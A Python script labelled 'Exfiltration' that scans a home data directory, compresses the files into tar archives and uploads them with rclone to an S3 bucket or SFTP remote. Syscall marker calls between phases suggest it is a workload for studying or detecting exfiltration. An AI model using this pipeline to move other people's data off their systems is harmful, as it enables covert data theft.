#!/usr/bin/python3
import os
import tarfile
import shutil
import queue
import threading
import subprocess
import argparse
from pathlib import Path
import multiprocessing
import io
import zstandard as zstd
from datetime import datetime

import sysmark

# ====== CONFIGURATION ======
ARCHIVE_DIR = "archives"
stop_signal = object()
# Ensure output dirs exist
Path(ARCHIVE_DIR).mkdir(exist_ok=True)

# ====== STAGE 1: SCANNING ======
def run_scanner(scan_path, file_queue, num_threads, stop_count):
    for root, dirs, files in os.walk(scan_path):
        for file in files:
            full_path = os.path.join(root, file)
            file_queue.put(full_path)
    for _ in range(stop_count):
        file_queue.put(stop_signal)
    print(f"[Scanner] Done.")

# ====== STAGE 2: COMPRESSION ======
def compress_gzip_worker(file_queue, thread_id, scan_path, barrier):
    archive_path = os.path.join(ARCHIVE_DIR, f"archive_{thread_id}.tar.gz")
    count = 0
    with tarfile.open(archive_path, "w:gz") as tar:
        while True:
            file_path = file_queue.get()
            if file_path is stop_signal:
                count+=1
                file_queue.task_done()
                break
            arcname = os.path.relpath(file_path, scan_path)
            tar.add(file_path, arcname=arcname)
            count+=1
            file_queue.task_done()
    barrier.wait()
    file_queue.put(archive_path)
    file_queue.put(stop_signal)

def compress_zstd_worker_1(file_queue, zstd_threads, scan_path):
    """
    Compress using sequential archive + zstd
    Result: output_path (e.g. archive.tar.zst)
    """
    archive_path = os.path.join(ARCHIVE_DIR, "archive_0.tar")
    compressed_path = archive_path + ".zst"

    print(f"Object before compression: {file_queue.qsize()}")
    with tarfile.open(archive_path, "w") as tar:
        while True:
            file_path = file_queue.get()
            if file_path is stop_signal:
                file_queue.task_done()
                break
            arcname = os.path.relpath(file_path, scan_path)
            tar.add(file_path, arcname=arcname)
            file_queue.task_done()

    thread_arg=f"-T{zstd_threads}"
    subprocess.run([
        "zstd", thread_arg, archive_path, "-o", compressed_path], check=True)
    os.remove(archive_path)
    print(f"Object after compression: {file_queue.qsize()}")
    file_queue.join()
    file_queue.put(compressed_path)
    file_queue.put(stop_signal)

def compress_zstd_worker_2(file_queue, zstd_threads, scan_path):
    """
    Compress using subprocess pipeline: tar | zstd
    Result: output_path (e.g. archive.tar.zst)
    """
    archive_path = os.path.join(ARCHIVE_DIR, "archive_0.tar.zst")
    thread_arg=f"-T{zstd_threads}"
    zstd_proc = subprocess.Popen(
        ["zstd", thread_arg, "-o", archive_path],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )

    with tarfile.open(fileobj=zstd_proc.stdin, mode="w|") as tar:
        while True:
            file_path = file_queue.get()
            if file_path is stop_signal:
                file_queue.task_done()
                break
            arcname = os.path.relpath(file_path, scan_path)
            tar.add(file_path, arcname=arcname)
            file_queue.task_done()
    
    zstd_proc.stdin.close()  # Allow tar_proc to receive SIGPIPE if zstd exits
    
    file_queue.join()
    file_queue.put(archive_path)
    file_queue.put(stop_signal)

def compress_zstd_worker_3(file_queue, zstd_threads, scan_path):
    """
    Pure Python: stream tar archive into zstandard compressor
    Result: output_path (e.g. archive.tar.zst)
    """
    archive_path = os.path.join(ARCHIVE_DIR, "archive_0.tar.zst")
    try:
        # Prepare the output file
        with open(archive_path, 'wb') as f_out:
            cctx = zstd.ZstdCompressor(threads=zstd_threads)
            with cctx.stream_writer(f_out) as zstd_writer:
                # Create tar archive in-memory and write to compressor stream
                with tarfile.open(mode='w|', fileobj=zstd_writer) as tar:
                    while True:
                        file_path = file_queue.get()
                        if file_path is stop_signal:
                            file_queue.task_done()
                            break
                        arcname = os.path.relpath(file_path, scan_path)
                        tar.add(file_path, arcname=arcname)
                        file_queue.task_done()
    except Exception as e:
        print(f"[compress_zstd_worker_3] Compression error: {e}")
    
    file_queue.join()
    file_queue.put(archive_path)
    file_queue.put(stop_signal)

def run_compression(file_queue, threads, compressor, path):
    print(f"Before compress: Queue size: {file_queue.qsize()}, Unfinished Tasks: {file_queue.unfinished_tasks}.")
    barrier = threading.Barrier(threads)
    if compressor == "gzip":
        workers = []
        for i in range(threads):
            t = threading.Thread(target=compress_gzip_worker, args=(file_queue, i, path, barrier), daemon=True)
            t.start()
            workers.append(t)
        for t in workers:
            t.join()
    elif "zstd" in compressor:
        if "1" in compressor:
            compress_zstd_worker_1(file_queue, threads, path)
        elif "2" in compressor:
            compress_zstd_worker_2(file_queue, threads, path)
        else:
            compress_zstd_worker_3(file_queue, threads, path)


# ====== STAGE 3: UPLOAD ======
def upload(REMOTE, queue, multipart, tpool):
    while True:
        fpath = queue.get()
        if fpath is stop_signal:
            queue.put(stop_signal)
            break
        try:
            rpath = f"{REMOTE}/{os.path.basename(fpath)}"
            if multipart:
                subprocess.run(["rclone", "copyto", fpath, rpath, "--multi-thread-streams", str(tpool)], check=True)
            else:
                subprocess.run(["rclone", "copyto", fpath, rpath], check=True)
            if ".tar" in fpath:
                os.remove(fpath)
        except subprocess.CalledProcessError as e:
            print(f"[Uploader] Failed: {fpath} {e}")
    print(f"[Uploader] Upload complete.")

def run_uploader(file_queue, threads, remote):
    queue_size = max(1,file_queue.qsize() - threads)
    now = datetime.now()
    path_str = now.strftime("%Y%m%d_%H%M%S")
    if remote == 'aws':
        REMOTE = f"anon-s3:rclone-psahu/uploads/{path_str}/"
    if remote == 'sftp':
        REMOTE = f"backup:/uploads/{path_str}/"
    
    workers = []
    if queue_size == 1 and threads > 1:
        t = threading.Thread(target=upload, args=(REMOTE, file_queue, True, threads), daemon=True)
        t.start()
        workers.append(t)
    else:
        for i in range(threads):
            t = threading.Thread(target=upload, args=(REMOTE, file_queue, False, threads), daemon=True)
            t.start()
            workers.append(t)
    for t in workers:
        t.join()

def get_parser():
    parser = argparse.ArgumentParser(description='Exfiltration')
    parser.add_argument('-d', '--dir', default="/mnt/home/Data")
    parser.add_argument('-c', '--compressor', default="gzip")
    parser.add_argument('-t', '--threads', default=1)
    parser.add_argument('-r', '--remote', default="sftp")
    parser.add_argument('-v', '--verbose', default=0)
    return parser

# ====== MAIN ======
def main():
    parser = get_parser()
    args = vars(parser.parse_args())
    directory = args['dir']
    compressor = args['compressor']
    THREADS = int(args['threads'])
    remote = args['remote']
    pid = int(args['verbose'])

    file_queue = queue.Queue()                 # Shared queue for file paths

    if pid>0:
        sysmark.invoke_syscall(pid,1)
    
    print("[*] Scanning files...")
    if "zstd" in compressor:
        stops = 1
    else:
        stops = THREADS
    run_scanner(directory, file_queue, THREADS, stops)

    if pid>0:
        sysmark.invoke_syscall(pid,1)

    if compressor != "none":
        print("[*] Compressing files...")
        run_compression(file_queue, THREADS, compressor, directory)

    if pid>0:
        sysmark.invoke_syscall(pid,1)

    print("[*] Uploading files...")
    run_uploader(file_queue, THREADS, remote)

    if pid>0:
        sysmark.invoke_syscall(pid,1)

    print("[✓] Done.")


main()
